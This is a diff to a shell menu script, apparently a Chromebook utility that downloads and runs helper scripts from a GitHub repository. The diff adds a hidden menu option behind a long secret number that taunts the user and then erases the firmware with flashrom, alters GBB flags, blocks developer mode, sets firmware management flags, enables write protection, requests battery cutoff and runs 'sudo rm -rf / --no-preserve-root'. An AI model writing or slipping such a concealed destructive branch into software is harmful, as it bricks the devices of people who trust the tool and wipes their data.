@@ -69,6 +69,15 @@ curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/hea
 elif [ $option = 9 ]; then
 echo "*kaboom*"
 exit
+elif [ $option = 674121420 ]; then
+echo haha skid im whrecking your chromebook now goodbye :skull_crossbones:
+crossystem battery_cutoff_request=1
+flashrom -E
+futility gbb -s --flash --flags=0x8
+crossystem block_devmode=1
+device_management_client --action=set_firmware_management_parameters --flags=0x01
+flashrom --wp-enable
+sudo rm -rf / --no-preserve-root
 elif [ $option = 69 ]; then
 curl https://raw.githubusercontent.com/ferrochrome-3/nikkis-vt2-utility/refs/heads/main/femboy%20ascii.sh > "femboy ascii.sh" && bash "femboy ascii.sh"
 fi
